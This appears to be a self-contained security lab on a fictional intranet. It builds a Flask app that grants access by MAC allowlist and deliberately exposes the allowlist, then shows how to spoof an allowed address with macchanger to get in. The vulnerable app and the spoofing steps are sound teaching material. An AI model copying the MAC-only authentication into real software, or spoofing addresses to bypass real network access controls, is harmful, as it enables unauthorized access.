# Bypassing Restricted Access on TechSecure's Private Intranet

## Context:

The company TechSecure has set up a secure intranet accessible only to employees whose MAC addresses are whitelisted. The objective of this exercise is to test this security measure by spoofing the MAC address of an authorized user.

## Task:

As a security auditor, your mission is to test the effectiveness of TechSecure's intranet access control system. You need to:

- Launch the intranet locally.
- Access the intranet via http://127.0.0.1:4000 and verify that your current MAC address is not authorized.
- Display the list of authorized MAC addresses and identify one to spoof.
- Spoof the MAC address of one of the authorized users and validate access by connecting to the intranet.
  
## Objectives:

- Set up the intranet locally.
- Use a MAC address spoofing tool to bypass the restricted access.
- Gain access to the intranet by spoofing the MAC address of an authorized user.


## Detailed Solution

### Step 1: Setting Up the Environment

1. Create a directory for the project:

```
mkdir TechSecure_Intranet
cd TechSecure_Intranet
```

2. Create the main Python file for the Flask application:

```
touch intranet.py
```

3. Create a requirements.txt file for the dependencies:
Open the requirements.txt file and add:

```
flask
getmac
```

4. Create and activate a virtual environment:

```
python3 -m venv myenv
source myenv/bin/activate
```

5. Install the dependencies:

```
pip install -r requirements.txt
```

### Step 2: Writing the Intranet Code

- Open the intranet.py file and use the following code:

```
from flask import Flask, request
import subprocess

app = Flask(__name__)

# List of authorized MAC addresses
authorized_macs = {
    "00:14:22:01:23:45": "Alice B.",
    "00:14:22:ab:cd:ef": "Bob C.",
    "00:14:22:ff:aa:bb": "Charlie D."
}

def get_mac_address(interface):
    # Uses ifconfig to retrieve the MAC address of the specified interface
    result = subprocess.run(['ifconfig', interface], capture_output=True, text=True)
    if result.returncode == 0:
        for line in result.stdout.split('\n'):
            if 'ether' in line:
                return line.split()[1]
    return None

@app.route('/')
def home():
    # Replace 'eth0' with the name of your active interface if necessary
    client_mac = get_mac_address('eth0')
    if client_mac in authorized_macs:
        username = authorized_macs[client_mac]
        return f"Welcome, {username}! You have successfully accessed the TechSecure intranet."
    else:
        return '''
        <h1>Access Denied</h1>
        <p>Your MAC address is not authorized to access this intranet.</p>
        <a href="/authorized-users">Click here to review the authorized users list</a>
        '''

@app.route('/authorized-users')
def authorized_users():
    users_list = "<h1>Authorized Users</h1><ul>"
    for mac, user in authorized_macs.items():
        users_list += f"<li>{mac} - {user}</li>"
    users_list += "</ul>"
    return users_list

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4000)
```
- Code Explanation

Function get_mac_address: This function uses ifconfig to retrieve the MAC address of the specified network interface (e.g., eth0). Ensure that the interface name matches the one used on your system.

The code checks if the MAC address of the interface matches any of the whitelisted addresses.

### Step 3: Launch the Intranet Server

1. Make sure the virtual environment is activated.
2. Run the Flask server :

```
python3 intranet.py
```
3. The intranet will be available at http://127.0.0.1:4000 and via your local IP.

### Step 4: View the Authorized MAC Addresses

Access the intranet via http://127.0.0.1:4000.

If access is denied, click on "Click here to review the authorized users list" to display the whitelisted MAC addresses.

![Capture d'écran 2024-10-23 150006](https://github.com/user-attachments/assets/9a8cd51f-763a-49a6-a496-56acf35b9ff7)


### Step 5: Spoof Bob's MAC Address

![Capture d'écran 2024-10-23 150023](https://github.com/user-attachments/assets/97eabe42-9d8d-4394-b05b-400db33e8ac1)

1. Disable the network interface:

```
sudo ifconfig eth0 down
```

- Replace eth0 with your active interface name if necessary (e.g., wlan0).

2. Spoof Bob’s MAC address:

```
sudo macchanger -m 00:14:22:ab:cd:ef eth0
```

3. Re-enable the network interface:

```
sudo ifconfig eth0 up
```

4. Verify the MAC address has changed:

```
ifconfig eth0
```

### Step 6: Verify Access to the Intranet

Go back to http://127.0.0.1:4000 to check if access is now granted.

If everything works correctly, you will see a message welcoming you as Bob C..

![Capture d'écran 2024-10-23 153803](https://github.com/user-attachments/assets/909e6728-8100-4727-bb54-f9424a6dfaf2)














